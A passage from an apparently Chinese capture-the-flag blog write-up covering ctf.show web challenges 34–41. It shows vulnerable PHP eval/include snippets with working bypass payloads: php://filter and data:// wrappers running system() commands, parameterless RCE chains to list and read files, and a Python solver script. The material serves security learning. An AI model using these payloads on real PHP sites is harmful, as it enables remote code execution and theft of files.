class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">多过滤了冒号，使用前面的payload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include<span class="variable">$_GET</span>[a]?&gt;&amp;a=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web34.png"></p><p>base64解码一下</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web34-1.png"></p><p>​      </p><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">多过滤&lt; =,继续使用上把payload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include<span class="variable">$_GET</span>[a]?&gt;&amp;a=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">多过滤了数字，不影响，继续使用上把payload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include<span class="variable">$_GET</span>[a]?&gt;&amp;a=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">与前面不一样咯，使用了<span class="keyword">include</span>()函数执行了，文件包含，我们只要绕过<span class="string">&quot;/flag/i&quot;</span>就行</span><br><span class="line">PHP伪协议：</span><br><span class="line">file:<span class="comment">//   --访问本地文件系统</span></span><br><span class="line">http:<span class="comment">//    --访问HTTP(s)网址</span></span><br><span class="line">ftp:<span class="comment">//     --访问FTP(s)URLS</span></span><br><span class="line">php:<span class="comment">//    --访问各个输入/输出流(i/o streams)</span></span><br><span class="line">zlib:<span class="comment">//   --压缩流</span></span><br><span class="line">data:<span class="comment">//    --数据(RFC 2397 )</span></span><br><span class="line">glob:<span class="comment">//    --查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">//    --PHP归档</span></span><br><span class="line">ssh2:<span class="comment">//    --Secure Shell2</span></span><br><span class="line">rar:<span class="comment">//     --RAR</span></span><br><span class="line">ogg:<span class="comment">//     --音频流</span></span><br><span class="line">expect:<span class="comment">//  --处理交互式的流</span></span><br></pre></td></tr></table></figure><p>[文件包含漏洞 - FreeBuf](离线网页/Web安全实战系列：文件包含漏洞 - FreeBuf网络安全行业门户 (2023_4_8 18_25_47).html)</p><p>[php伪协议以及死亡绕过 - FreeBuf网络安全行业门户](离线网页\探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户 (2023_4_8 18_32_40).html) </p><p>本题我们使用data://伪协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=system(<span class="string">&quot;ls&quot;</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web37-0.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=system(<span class="string">&quot;tac fla&#x27;&#x27;g.ph&#x27;&#x27;p&quot;</span>);?&gt; //两个单引号可以截断</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web37-1.png"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web37.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/8 17:41</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://b182a99b-7f2c-4d05-adfc-c26669fa5528.challenge.ctf.show/&quot;</span></span><br><span class="line">shell_url = url +<span class="string">&quot;?c=data://text/plain,&lt;?=system(\&quot;tac fla\&#x27;g.ph\&#x27;p\&quot;);?&gt;&quot;</span> <span class="comment">#加反斜杠为了防止我们的引号被解析，并且python中引号最好按级嵌套，比如&quot; &#x27;&#x27; &quot; ,双引号里面放单引号，不然容易出错</span></span><br><span class="line">res = requests.get(shell_url)</span><br><span class="line">flag = re.search(<span class="string">&quot;(ctfshow&#123;.*?&#125;)&quot;</span>,res.text)</span><br><span class="line">flag = flag.group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web37-2.png"></p><p>​       </p><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了php，但是我们使用短标签，不带php关键字，继续使用上把payload，<span class="meta">&lt;?php</span><span class="meta">?&gt;</span>长标签，<span class="meta">&lt;?</span><span class="meta">?&gt;</span>短标签</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?=system(<span class="string">&quot;tac fla*&quot;</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web38.png"></p><p>​      </p><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤减少了，但是源码显示<span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>)，<span class="variable">$c</span>连接了.php，强制给我们的代码添加.php后缀，我们上把的代码有短标签<span class="meta">&lt;?</span><span class="meta">?&gt;</span>闭合，所以最后也是<span class="meta">&lt;?</span><span class="meta">?&gt;</span>.php不影响代码执行</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?=system(<span class="string">&quot;tac fla&#x27;&#x27;g.ph&#x27;&#x27;p&quot;</span>);?&gt;  //data:text/plain相当于执行了php代码了</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web40-无参rce"><a href="#web40-无参rce" class="headerlink" title="web40(无参rce)"></a>web40(无参rce)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">又回到了<span class="keyword">eval</span>函数执行命令，但是过滤了很多字符，又但是没有过滤因为的括号()。我们可以使用不带参数的函数来读取文件，就是无参数rce。无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(<span class="string">&#x27;b&#x27;</span>)或a(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)，不能带参数</span><br></pre></td></tr></table></figure><p> [无参数文件读取 - 博客园](离线网页\无参数文件读取 - NPFS - 博客园 (2023_4_9 00_34_36).html)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">  一些操作：</span><br><span class="line">getcwd()：取得当前工作目录，成功则返回当前工作目录</span><br><span class="line">dirname()：返回路径中的目录部分，返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（<span class="string">&#x27;.&#x27;</span>），表示当前目录</span><br><span class="line">scandir()：列出指定路径中的文件和目录。scandir(<span class="string">&#x27;.&#x27;</span>)表示当前目录，print_r(scandir(<span class="string">&#x27;.&#x27;</span>)); 则打印查看当前目录下的所有文件名</span><br><span class="line">current()：函数返回数组中的当前元素（单元）,默认取第一个值，pos()是current()的别名,它俩是一个东西</span><br><span class="line">localeconv()：函数返回一包含本地数字及货币格式信息的数组，而数组第一项就是一个点 `.`。所以我们current(localeconv())就是表示一个点`.`</span><br><span class="line">        </span><br><span class="line">    数组操作</span><br><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ：将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ：返回当前元素的键名和键值，并将内部指针向前移动</span><br><span class="line">array_reverse() : 以相反的元素顺序返回数组</span><br><span class="line">    </span><br><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line">用法：</span><br><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); <span class="comment">// 列当前目录</span></span><br><span class="line">print_r(glob(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// 列根目录</span></span><br><span class="line">print_r(scandir(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"><span class="variable">$d</span>=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$d</span>=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="variable">$d</span>-&gt;read()))&#123;<span class="keyword">echo</span><span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=glob(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br><span class="line">        </span><br><span class="line">读文件</span><br><span class="line">highlight_file(<span class="variable">$filename</span>);</span><br><span class="line">show_source(<span class="variable">$filename</span>);</span><br><span class="line">print_r(php_strip_whitespace(<span class="variable">$filename</span>));</span><br><span class="line">print_r(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">readfile(<span class="variable">$filename</span>);</span><br><span class="line">print_r(file(<span class="variable">$filename</span>)); <span class="comment">// var_dump</span></span><br><span class="line">fread(fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line">print_r(fread(popen(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line">print_r(fgets(fopen(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line">fpassthru(fopen(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// 从当前位置一直读取到 EOF</span></span><br><span class="line">print_r(fgetcsv(fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line">print_r(fgetss(fopen(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line">print_r(fscanf(fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line">print_r(parse_ini_file(<span class="variable">$filename</span>)); <span class="comment">// 失败时返回 false , 成功返回配置数组  </span></span><br><span class="line">常用：</span><br><span class="line">show_source() : 对文件进行语法高亮显示。</span><br><span class="line">readfile() : 输出一个文件。</span><br><span class="line">highlight_file() : 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() : 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() : 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    打印函数</span><br><span class="line"><span class="keyword">echo</span>,<span class="keyword">print</span>,printf 可以打印变量内容，但不能显示数组及系统超级变量数组；</span><br><span class="line">print_r 和 var_dump 不仅可以打印数组、标量变量，还可以打印对象的内容；</span><br><span class="line">var_dump 语句不仅能打印变量、数组内容，还可以显示布尔变量和资源（resource）的内容；</span><br><span class="line">var_export 函数返回关于传递给该函数的变量的结构信息，和 var_dump()函数类似，不同的是其返回的内容是合法的php代码。</span><br></pre></td></tr></table></figure><p>现在我们打印一下我们当前目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web40.png"></p><p>读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line">或者：</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">或者：</span><br><span class="line">?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web40-0.png"></p><h4 id="知识点：scandir"><a href="#知识点：scandir" class="headerlink" title="知识点：scandir()"></a>知识点：scandir()</h4><p>文件读取</p><h5 id="查看根目录"><a href="#查看根目录" class="headerlink" title="查看根目录"></a>查看根目录</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><h5 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><h5 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当前目录倒数第一位文件：</span><br><span class="line">show_source(end(scandir(getcwd())));</span><br><span class="line">show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">当前目录倒数第二位文件：</span><br><span class="line">show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">随机返回当前目录文件：</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h5 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><h5 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure><p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p><h5 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h5><p>所获得的字符串第一位有几率是/，需要多试几次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">过滤了数字和字母还有一些其他符号，但我们可以利用或运算符进行构造payload进行命令执行。因为[<span class="number">0</span>-<span 